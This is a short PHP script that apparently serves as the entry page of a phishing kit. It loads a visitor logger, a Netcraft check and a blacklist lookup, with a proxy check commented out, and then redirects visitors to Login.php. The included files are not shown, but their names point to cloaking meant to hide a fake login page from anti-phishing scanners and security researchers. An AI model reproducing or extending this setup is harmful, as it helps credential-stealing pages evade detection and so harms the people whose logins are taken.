<?php

# require "assets/includes/proxy_check.php";
require "../../includes/visitor_log.php";
require "../../includes/netcraft_check.php";
require "../../includes/blacklist_lookup.php";

header("Location: Login.php");
die();

?>